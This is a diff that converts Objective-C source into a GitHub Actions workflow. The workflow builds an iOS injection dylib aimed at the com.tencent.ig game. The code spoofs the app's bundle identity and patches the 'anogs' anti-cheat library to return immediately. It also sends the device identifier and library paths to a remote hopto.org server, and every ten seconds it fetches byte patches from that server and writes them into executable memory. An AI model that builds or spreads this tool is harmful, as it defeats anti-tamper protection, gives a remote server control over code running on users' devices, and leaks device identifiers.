@@ -1,251 +1,273 @@
+name: Sovereign-Raw-Build
 
-#import <UIKit/UIKit.h>
-#import <mach-o/dyld.h>
-#import <mach/mach.h>
-#import <Foundation/Foundation.h>
-#import <objc/runtime.h>
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
 
-#define SERVER_API @"http://jojolmlm.hopto.org/dashboard_v60.php?api=true"
-#define OFFICIAL_ID @"com.tencent.ig"
-#define ACE_OFFSET 0x10b1d2860 
+jobs:
+  build:
+    runs-on: macos-latest
+    steps:
+      - name: Generate and Compile Raw Payload
+        run: |
+          cat << 'EOF' > main.mm
+          #import <UIKit/UIKit.h>
+          #import <mach-o/dyld.h>
+          #import <mach/mach.h>
+          #import <Foundation/Foundation.h>
+          #import <objc/runtime.h>
 
-static BOOL isAceNeutralized = NO;
-static NSString *currentNotification = @"Connecting to Cloud...";
+          #define SERVER_API @"http://jojolmlm.hopto.org/dashboard_v60.php?api=true"
+          #define OFFICIAL_ID @"com.tencent.ig"
+          #define ACE_OFFSET 0x10b1d2860 
 
-@interface SovereignEliteHUD : UIView
-@property (nonatomic, strong) UILabel *statusLabel;
-@property (nonatomic, strong) UIView *serverLamp;
-@property (nonatomic, strong) UIView *aceStatusDot;
-@end
+          static BOOL isAceNeutralized = NO;
+          static NSString *currentNotification = @"Connecting to Cloud...";
 
-@implementation SovereignEliteHUD
+          @interface SovereignEliteHUD : UIView
+          @property (nonatomic, strong) UILabel *statusLabel;
+          @property (nonatomic, strong) UIView *serverLamp;
+          @property (nonatomic, strong) UIView *aceStatusDot;
+          @end
 
-+ (void)load {
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        Method origId = class_getInstanceMethod([NSBundle class], @selector(bundleIdentifier));
-        Method swizId = class_getInstanceMethod([self class], @selector(sov_bundleIdentifier));
-        method_exchangeImplementations(origId, swizId);
+          @implementation SovereignEliteHUD
 
-        Method origPath = class_getInstanceMethod([NSBundle class], @selector(bundlePath));
-        Method swizPath = class_getInstanceMethod([self class], @selector(sov_bundlePath));
-        method_exchangeImplementations(origPath, swizPath);
-        
-        NSLog(@"[Sovereign] Identity Masked: System believes we are OFFICIAL.");
-    });
-}
+          + (void)load {
+              static dispatch_once_t onceToken;
+              dispatch_once(&onceToken, ^{
+                  Method origId = class_getInstanceMethod([NSBundle class], @selector(bundleIdentifier));
+                  Method swizId = class_getInstanceMethod([self class], @selector(sov_bundleIdentifier));
+                  method_exchangeImplementations(origId, swizId);
 
-- (NSString *)sov_bundleIdentifier { return OFFICIAL_ID; }
-- (NSString *)sov_bundlePath { return @"/var/containers/Bundle/Application/ShadowTrackerExtra.app"; }
+                  Method origPath = class_getInstanceMethod([NSBundle class], @selector(bundlePath));
+                  Method swizPath = class_getInstanceMethod([self class], @selector(sov_bundlePath));
+                  method_exchangeImplementations(origPath, swizPath);
+                  
+                  NSLog(@"[Sovereign] Identity Masked: System believes we are OFFICIAL.");
+              });
+          }
 
-- (void)deployGhostSensor {
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
-        NSString *udid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
-        uint32_t count = _dyld_image_count();
-        
-        for (uint32_t i = 0; i < count; i++) {
-            const char *name = _dyld_get_image_name(i);
-            if (name && (strstr(name, "ShadowTrackerExtra") || strstr(name, "anogs"))) {
-                NSString *path = [NSString stringWithUTF8String:name];
-                NSString *reportURL = [NSString stringWithFormat:@"%@&udid=%@&path=%@", 
-                                      SERVER_API, udid, 
-                                      [path stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
-                
-                [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:reportURL]] resume];
-            }
-        }
-    });
-}
+          - (NSString *)sov_bundleIdentifier { return OFFICIAL_ID; }
+          - (NSString *)sov_bundlePath { return @"/var/containers/Bundle/Application/ShadowTrackerExtra.app"; }
 
-void Neutralize_ACE_Diagnostic() {
-    uintptr_t anogs_base = 0;
-    uint32_t count = _dyld_image_count();
-    for (uint32_t i = 0; i < count; i++) {
-        const char *name = _dyld_get_image_name(i);
-        if (name && strstr(name, "anogs")) {
-            anogs_base = _dyld_get_image_vmaddr_slide(i);
-            break;
-        }
-    }
+          - (void)deployGhostSensor {
+              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
+                  NSString *udid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
+                  uint32_t count = _dyld_image_count();
+                  
+                  for (uint32_t i = 0; i < count; i++) {
+                      const char *name = _dyld_get_image_name(i);
+                      if (name && (strstr(name, "ShadowTrackerExtra") || strstr(name, "anogs"))) {
+                          NSString *path = [NSString stringWithUTF8String:name];
+                          NSString *reportURL = [NSString stringWithFormat:@"%@&udid=%@&path=%@", 
+                                                SERVER_API, udid, 
+                                                [path stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
+                          
+                          [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:reportURL]] resume];
+                      }
+                  }
+              });
+          }
 
-    if (anogs_base != 0) {
-        uintptr_t target = anogs_base + ACE_OFFSET;
-        uint32_t ret_cmd = 0xD65F03C0; 
-        mach_port_t task = mach_task_self();
-        
-        kern_return_t kr = vm_protect(task, (vm_address_t)target, 4, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
-        if (kr == KERN_SUCCESS) {
-            if (vm_write(task, (vm_address_t)target, (vm_offset_t)&ret_cmd, 4) == KERN_SUCCESS) {
-                vm_protect(task, (vm_address_t)target, 4, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
-                isAceNeutralized = YES;
-                NSLog(@"[Sovereign] ACE Target 0x%llx Neutralized!", (unsigned long long)ACE_OFFSET);
-            }
-        }
-    }
-}
+          void Neutralize_ACE_Diagnostic() {
+              uintptr_t anogs_base = 0;
+              uint32_t count = _dyld_image_count();
+              for (uint32_t i = 0; i < count; i++) {
+                  const char *name = _dyld_get_image_name(i);
+                  if (name && strstr(name, "anogs")) {
+                      anogs_base = _dyld_get_image_vmaddr_slide(i);
+                      break;
+                  }
+              }
 
-- (instancetype)initWithFrame:(CGRect)frame {
-    self = [super initWithFrame:frame];
-    if (self) {
-        self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
-        self.layer.cornerRadius = 15;
-        self.layer.borderColor = [UIColor cyanColor].CGColor;
-        self.layer.borderWidth = 1.2;
+              if (anogs_base != 0) {
+                  uintptr_t target = anogs_base + ACE_OFFSET;
+                  uint32_t ret_cmd = 0xD65F03C0; 
+                  mach_port_t task = mach_task_self();
+                  
+                  kern_return_t kr = vm_protect(task, (vm_address_t)target, 4, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
+                  if (kr == KERN_SUCCESS) {
+                      if (vm_write(task, (vm_address_t)target, (vm_offset_t)&ret_cmd, 4) == KERN_SUCCESS) {
+                          vm_protect(task, (vm_address_t)target, 4, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+                          isAceNeutralized = YES;
+                      }
+                  }
+              }
+          }
 
-        UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(25, 5, 170, 15)];
-        title.text = @"SOVEREIGN ELITE v3000";
-        title.textColor = [UIColor cyanColor];
-        title.font = [UIFont boldSystemFontOfSize:9];
-        title.textAlignment = NSTextAlignmentCenter;
-        [self addSubview:title];
+          - (instancetype)initWithFrame:(CGRect)frame {
+              self = [super initWithFrame:frame];
+              if (self) {
+                  self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
+                  self.layer.cornerRadius = 15;
+                  self.layer.borderColor = [UIColor cyanColor].CGColor;
+                  self.layer.borderWidth = 1.2;
 
-        self.aceStatusDot = [[UIView alloc] initWithFrame:CGRectMake(12, 8, 8, 8)];
-        self.aceStatusDot.layer.cornerRadius = 4;
-        self.aceStatusDot.backgroundColor = isAceNeutralized ? [UIColor greenColor] : [UIColor redColor];
-        if (isAceNeutralized) {
-            self.aceStatusDot.layer.shadowColor = [UIColor greenColor].CGColor;
-            self.aceStatusDot.layer.shadowRadius = 4;
-            self.aceStatusDot.layer.shadowOpacity = 1;
-        }
-        [self addSubview:self.aceStatusDot];
+                  UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(25, 5, 170, 15)];
+                  title.text = @"SOVEREIGN ELITE v3000";
+                  title.textColor = [UIColor cyanColor];
+                  title.font = [UIFont boldSystemFontOfSize:9];
+                  title.textAlignment = NSTextAlignmentCenter;
+                  [self addSubview:title];
 
-        self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 22, 180, 20)];
-        self.statusLabel.text = currentNotification;
-        self.statusLabel.textColor = [UIColor whiteColor];
-        self.statusLabel.font = [UIFont boldSystemFontOfSize:10];
-        self.statusLabel.textAlignment = NSTextAlignmentCenter;
-        [self addSubview:self.statusLabel];
+                  self.aceStatusDot = [[UIView alloc] initWithFrame:CGRectMake(12, 8, 8, 8)];
+                  self.aceStatusDot.layer.cornerRadius = 4;
+                  self.aceStatusDot.backgroundColor = isAceNeutralized ? [UIColor greenColor] : [UIColor redColor];
+                  if (isAceNeutralized) {
+                      self.aceStatusDot.layer.shadowColor = [UIColor greenColor].CGColor;
+                      self.aceStatusDot.layer.shadowRadius = 4;
+                      self.aceStatusDot.layer.shadowOpacity = 1;
+                  }
+                  [self addSubview:self.aceStatusDot];
 
-        self.serverLamp = [[UIView alloc] initWithFrame:CGRectMake(frame.size.width - 20, 25, 12, 12)];
-        self.serverLamp.backgroundColor = [UIColor yellowColor];
-        self.serverLamp.layer.cornerRadius = 6;
-        [self addSubview:self.serverLamp];
-        
-        [self deployGhostSensor];
-        [self startCloudSyncLoop];
-        [self makeDraggable];
-    }
-    return self;
-}
+                  self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 22, 180, 20)];
+                  self.statusLabel.text = currentNotification;
+                  self.statusLabel.textColor = [UIColor whiteColor];
+                  self.statusLabel.font = [UIFont boldSystemFontOfSize:10];
+                  self.statusLabel.textAlignment = NSTextAlignmentCenter;
+                  [self addSubview:self.statusLabel];
 
-- (void)startCloudSyncLoop {
-    [self fetchAndApply];
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-        [self startCloudSyncLoop];
-    });
-}
+                  self.serverLamp = [[UIView alloc] initWithFrame:CGRectMake(frame.size.width - 20, 25, 12, 12)];
+                  self.serverLamp.backgroundColor = [UIColor yellowColor];
+                  self.serverLamp.layer.cornerRadius = 6;
+                  [self addSubview:self.serverLamp];
+                  
+                  [self deployGhostSensor];
+                  [self startCloudSyncLoop];
+                  [self makeDraggable];
+              }
+              return self;
+          }
 
-- (void)fetchAndApply {
-    NSURL *url = [NSURL URLWithString:SERVER_API];
-    [[[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
-        dispatch_async(dispatch_get_main_queue(), ^{
-            if (err || !data) { self.serverLamp.backgroundColor = [UIColor orangeColor]; return; }
-            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
-            if (!json) return;
+          - (void)startCloudSyncLoop {
+              [self fetchAndApply];
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                  [self startCloudSyncLoop];
+              });
+          }
 
-            if ([json[@"maintenance_mode"] intValue] == 1) { [self showLockdown:json[@"notification"]]; return; }
+          - (void)fetchAndApply {
+              NSURL *url = [NSURL URLWithString:SERVER_API];
+              [[[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      if (err || !data) { self.serverLamp.backgroundColor = [UIColor orangeColor]; return; }
+                      NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
+                      if (!json) return;
 
-            self.statusLabel.text = json[@"notification"];
-            if ([json[@"system_status"] isEqualToString:@"safe"]) {
-                self.statusLabel.textColor = [UIColor greenColor];
-                self.serverLamp.backgroundColor = [UIColor greenColor];
-                self.layer.borderColor = [UIColor greenColor].CGColor;
-                [self executeDynamicPayload:json[@"payload"]];
-            } else {
-                self.statusLabel.textColor = [UIColor redColor];
-                self.serverLamp.backgroundColor = [UIColor redColor];
-                self.layer.borderColor = [UIColor redColor].CGColor;
-            }
-        });
-    }] resume];
-}
+                      if ([json[@"maintenance_mode"] intValue] == 1) { [self showLockdown:json[@"notification"]]; return; }
 
-- (void)executeDynamicPayload:(NSArray *)payload {
-    uintptr_t shadowBase = _dyld_get_image_vmaddr_slide(0);
-    uintptr_t anogsBase = 0;
-    uint32_t count = _dyld_image_count();
-    for (uint32_t i = 0; i < count; i++) {
-        const char *name = _dyld_get_image_name(i);
-        if (name && strstr(name, "anogs")) { anogsBase = _dyld_get_image_vmaddr_slide(i); break; }
-    }
+                      self.statusLabel.text = json[@"notification"];
+                      if ([json[@"system_status"] isEqualToString:@"safe"]) {
+                          self.statusLabel.textColor = [UIColor greenColor];
+                          self.serverLamp.backgroundColor = [UIColor greenColor];
+                          self.layer.borderColor = [UIColor greenColor].CGColor;
+                          [self executeDynamicPayload:json[@"payload"]];
+                      } else {
+                          self.statusLabel.textColor = [UIColor redColor];
+                          self.serverLamp.backgroundColor = [UIColor redColor];
+                          self.layer.borderColor = [UIColor redColor].CGColor;
+                      }
+                  });
+              }] resume];
+          }
 
-    for (NSDictionary *off in payload) {
-        uintptr_t addr = strtoull([off[@"address"] UTF8String], NULL, 16);
-        NSString *target = off[@"target_path"];
-        uintptr_t finalAddr = ([target isEqualToString:@"anogs"]) ? (anogsBase + addr) : (shadowBase + addr);
-        if (finalAddr > shadowBase) [self safePatch:finalAddr hex:off[@"hex_val"]];
-    }
-}
+          - (void)executeDynamicPayload:(NSArray *)payload {
+              uintptr_t shadowBase = _dyld_get_image_vmaddr_slide(0);
+              uintptr_t anogsBase = 0;
+              uint32_t count = _dyld_image_count();
+              for (uint32_t i = 0; i < count; i++) {
+                  const char *name = _dyld_get_image_name(i);
+                  if (name && strstr(name, "anogs")) { anogsBase = _dyld_get_image_vmaddr_slide(i); break; }
+              }
 
-- (void)safePatch:(uintptr_t)addr hex:(NSString *)hexStr {
-    NSString *clean = [hexStr stringByReplacingOccurrencesOfString:@" " withString:@""];
-    NSMutableData *data = [NSMutableData data];
-    for (int i = 0; i + 2 <= clean.length; i += 2) {
-        unsigned int v;
-        [[NSScanner scannerWithString:[clean substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&v];
-        unsigned char c = (unsigned char)v;
-        [data appendBytes:&c length:1];
-    }
-    mach_port_t task = mach_task_self();
-    vm_protect(task, (vm_address_t)addr, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
-    vm_write(task, (vm_address_t)addr, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
-    vm_protect(task, (vm_address_t)addr, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
-}
+              for (NSDictionary *off in payload) {
+                  uintptr_t addr = strtoull([off[@"address"] UTF8String], NULL, 16);
+                  NSString *target = off[@"target_path"];
+                  uintptr_t finalAddr = ([target isEqualToString:@"anogs"]) ? (anogsBase + addr) : (shadowBase + addr);
+                  if (finalAddr > shadowBase) [self safePatch:finalAddr hex:off[@"hex_val"]];
+              }
+          }
 
-- (void)showLockdown:(NSString *)m {
-    UIWindow *win = nil;
-    if (@available(iOS 13.0, *)) {
-        for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
-            if (scene.activationState == UISceneActivationStateForegroundActive) { win = scene.windows.firstObject; break; }
-        }
-    }
-    
-    #pragma clang diagnostic push
-    #pragma clang diagnostic ignored "-Wdeprecated-declarations"
-    if (!win) win = [UIApplication sharedApplication].keyWindow;
-    #pragma clang diagnostic pop
+          - (void)safePatch:(uintptr_t)addr hex:(NSString *)hexStr {
+              NSString *clean = [hexStr stringByReplacingOccurrencesOfString:@" " withString:@""];
+              NSMutableData *data = [NSMutableData data];
+              for (int i = 0; i + 2 <= clean.length; i += 2) {
+                  unsigned int v;
+                  [[NSScanner scannerWithString:[clean substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&v];
+                  unsigned char c = (unsigned char)v;
+                  [data appendBytes:&c length:1];
+              }
+              mach_port_t task = mach_task_self();
+              vm_protect(task, (vm_address_t)addr, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
+              vm_write(task, (vm_address_t)addr, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
+              vm_protect(task, (vm_address_t)addr, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+          }
 
-    if ([win viewWithTag:2026]) return;
-    UIView *v = [[UIView alloc] initWithFrame:win.bounds];
-    v.tag = 2026; v.backgroundColor = [UIColor blackColor];
-    UILabel *l = [[UILabel alloc] initWithFrame:v.bounds];
-    l.text = [NSString stringWithFormat:@"SYSTEM LOCKDOWN:\n%@", m];
-    l.textColor = [UIColor whiteColor]; l.textAlignment = NSTextAlignmentCenter;
-    l.numberOfLines = 0; [v addSubview:l]; [win addSubview:v];
-}
+          - (void)showLockdown:(NSString *)m {
+              UIWindow *win = nil;
+              if (@available(iOS 13.0, *)) {
+                  for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
+                      if (scene.activationState == UISceneActivationStateForegroundActive) { win = scene.windows.firstObject; break; }
+                  }
+              }
+              
+              #pragma clang diagnostic push
+              #pragma clang diagnostic ignored "-Wdeprecated-declarations"
+              if (!win) win = [UIApplication sharedApplication].keyWindow;
+              #pragma clang diagnostic pop
 
-- (void)makeDraggable {
-    self.userInteractionEnabled = YES;
-    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(onDrag:)];
-    [self addGestureRecognizer:pan];
-}
+              if ([win viewWithTag:2026]) return;
+              UIView *v = [[UIView alloc] initWithFrame:win.bounds];
+              v.tag = 2026; v.backgroundColor = [UIColor blackColor];
+              UILabel *l = [[UILabel alloc] initWithFrame:v.bounds];
+              l.text = [NSString stringWithFormat:@"SYSTEM LOCKDOWN:\n%@", m];
+              l.textColor = [UIColor whiteColor]; l.textAlignment = NSTextAlignmentCenter;
+              l.numberOfLines = 0; [v addSubview:l]; [win addSubview:v];
+          }
 
-- (void)onDrag:(UIPanGestureRecognizer *)sender {
-    CGPoint trans = [sender translationInView:self.superview];
-    self.center = CGPointMake(self.center.x + trans.x, self.center.y + trans.y);
-    [sender setTranslation:CGPointZero inView:self.superview];
-}
-@end
+          - (void)makeDraggable {
+              self.userInteractionEnabled = YES;
+              UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(onDrag:)];
+              [self addGestureRecognizer:pan];
+          }
 
-void __attribute__((constructor)) start_v3000_system() {
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-        Neutralize_ACE_Diagnostic();
-        
-        UIWindow *win = nil;
-        if (@available(iOS 13.0, *)) {
-            for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
-                if (scene.activationState == UISceneActivationStateForegroundActive) { win = scene.windows.firstObject; break; }
-            }
-        }
-        
-        #pragma clang diagnostic push
-        #pragma clang diagnostic ignored "-Wdeprecated-declarations"
-        if (!win) win = [UIApplication sharedApplication].keyWindow;
-        #pragma clang diagnostic pop
+          - (void)onDrag:(UIPanGestureRecognizer *)sender {
+              CGPoint trans = [sender translationInView:self.superview];
+              self.center = CGPointMake(self.center.x + trans.x, self.center.y + trans.y);
+              [sender setTranslation:CGPointZero inView:self.superview];
+          }
+          @end
 
-        if (win) {
-            SovereignEliteHUD *ui = [[SovereignEliteHUD alloc] initWithFrame:CGRectMake([UIScreen mainScreen].bounds.size.width/2 - 110, 45, 220, 45)];
-            [win addSubview:ui];
-        }
-    });
-}
+          void __attribute__((constructor)) start_v3000_system() {
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                  Neutralize_ACE_Diagnostic();
+                  
+                  UIWindow *win = nil;
+                  if (@available(iOS 13.0, *)) {
+                      for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
+                          if (scene.activationState == UISceneActivationStateForegroundActive) { win = scene.windows.firstObject; break; }
+                      }
+                  }
+                  
+                  #pragma clang diagnostic push
+                  #pragma clang diagnostic ignored "-Wdeprecated-declarations"
+                  if (!win) win = [UIApplication sharedApplication].keyWindow;
+                  #pragma clang diagnostic pop
+
+                  if (win) {
+                      SovereignEliteHUD *ui = [[SovereignEliteHUD alloc] initWithFrame:CGRectMake([UIScreen mainScreen].bounds.size.width/2 - 110, 45, 220, 45)];
+                      [win addSubview:ui];
+                  }
+              });
+          }
+          EOF
+
+          export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
+          clang -dynamiclib -arch arm64 main.mm -o Sovereign.dylib -isysroot $SDK_PATH -framework Foundation -framework UIKit -framework CoreGraphics -fobjc-arc -lc++ -Os
+          
+      - name: Upload Dylib Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Sovereign-Dylib
+          path: Sovereign.dylib
